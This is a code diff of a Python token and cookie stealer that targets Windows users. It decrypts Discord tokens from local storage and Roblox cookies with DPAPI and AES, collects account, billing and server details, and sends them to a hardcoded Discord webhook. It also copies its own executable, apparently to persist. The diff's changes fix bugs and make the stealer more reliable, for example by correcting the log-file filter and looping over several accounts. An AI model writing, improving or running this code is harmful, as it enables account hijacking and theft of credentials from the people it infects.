@@ -1,30 +1,10 @@
 webhook = "https://discord.com/api/webhooks/1552126592480841819/8CPld6L6LApYcwYxRdtNqeFZB5Bu2O06vTjkqo_ZaSmb-lvTvGO3Xmb3Bus87bHYjF4I"
 
-LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
     'Discord': ROAMING + '\\discord',
     'Discord Canary': ROAMING + '\\discordcanary',
-    'Lightcord': ROAMING + '\\Lightcord',
     'Discord PTB': ROAMING + '\\discordptb',
-    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
-    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
-    'Amigo': LOCAL + '\\Amigo\\User Data',
-    'Torch': LOCAL + '\\Torch\\User Data',
-    'Kometa': LOCAL + '\\Kometa\\User Data',
-    'Orbitum': LOCAL + '\\Orbitum\\User Data',
-    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
-    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
-    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
-    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
-    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
-    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
-    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
-    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
-    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
-    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
-    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
 }
 
 def getheaders(token=None):
@@ -46,7 +26,7 @@ def gettokens(path):
         return tokens
 
     for file in os.listdir(path):
-        if not file.endswith(".ldb") and file.endswith(".log"):
+        if not (file.endswith(".ldb") or file.endswith(".log")):
             continue
 
         try:
@@ -58,11 +38,10 @@ def gettokens(path):
             continue
 
     return tokens
-    
+
 def getkey(path):
     with open(path + f"\\Local State", "r") as file:
         key = json.loads(file.read())['os_crypt']['encrypted_key']
-        file.close()
 
     return key
 
@@ -75,66 +54,75 @@ def getip():
 
 def main():
     checked = []
+    usernames = []
 
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
 
-        for token in gettokens(path):
-            token = token.replace("\\", "") if token.endswith("\\") else token
+        for raw in gettokens(path):
+            token = raw.replace("\\", "") if raw.endswith("\\") else raw
 
             try:
-                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
-                if token in checked:
-                    continue
-                checked.append(token)
+                token = AES.new(
+                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
+                    AES.MODE_GCM,
+                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15],
+                ).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+            except Exception as e:
+                print(f"ERROR [{platform}]: {e}")
+                continue
 
+            if token in checked:
+                continue
+            checked.append(token)
+
+            try:
                 res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                 if res.getcode() != 200:
                     continue
                 res_json = json.loads(res.read().decode())
                 username = res_json['username']
-                
+
                 badges = ""
                 flags = res_json['flags']
-                if flags == 64 or flags == 96:
+                if flags & 64:
                     badges += ":BadgeBravery: "
-                if flags == 128 or flags == 160:
+                if flags & 128:
                     badges += ":BadgeBrilliance: "
-                if flags == 256 or flags == 288:
+                if flags & 256:
                     badges += ":BadgeBalance: "
 
                 params = urllib.parse.urlencode({"with_counts": True})
-                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
-                guilds = len(res)
+                guilds_res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(guilds_res)
                 guild_infos = ""
 
-                for guild in res:
+                for guild in guilds_res:
                     if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        detail = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                         vanity = ""
 
-                        if res["vanity_url_code"] != None:
-                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+                        if detail["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{detail["vanity_url_code"]}"""
 
                         guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                 if guild_infos == "":
                     guild_infos = "No guilds"
 
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
-                has_nitro = False
-                has_nitro = bool(len(res) > 0)
+                subs = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = bool(len(subs) > 0)
                 exp_date = None
                 if has_nitro:
                     badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+                    exp_date = datetime.datetime.strptime(subs[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
 
-                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                slots = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                 available = 0
                 print_boost = ""
                 boost = False
-                for id in res:
-                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                for slot in slots:
+                    cooldown = datetime.datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                     if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                         print_boost += f"ㅤ- Available now\n"
                         available += 1
@@ -176,12 +164,15 @@ def main():
                 }
 
                 urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
-                return username    
-            except urllib.error.HTTPError or json.JSONDecodeError:
+                usernames.append(username)
+                break
+            except urllib.error.HTTPError:
                 continue
             except Exception as e:
-                print(f"ERROR: {e}")
+                print(f"ERROR [{platform}]: {e}")
                 continue
+
+    return usernames
 
 def roblox(username):
     user_profile = os.getenv("USERPROFILE", "")
@@ -189,19 +180,19 @@ def roblox(username):
 
     if not os.path.exists(roblox_cookies_path):
         return
-    
+
     temp_dir = os.getenv("TEMP", "")
     destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
     shutil.copy(roblox_cookies_path, destination_path)
 
     with open(destination_path, 'r', encoding='utf-8') as file:
         file_content = json.load(file)
-        
+
         encoded_cookies = file_content.get("CookiesData", "")
-        
+
         if encoded_cookies:
             decoded_cookies = base64.b64decode(encoded_cookies)
-            
+
             decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
             cookie = decrypted_cookies.decode('utf-8', errors='ignore')
             requests.post(webhook, headers=getheaders(), json={
@@ -221,6 +212,6 @@ def copy():
         shutil.copy(sys.executable, dst)
 
 if __name__ == "__main__":
-    username = main()
-    roblox(username)
+    for username in (main() or [None]):
+        roblox(username)
     copy()
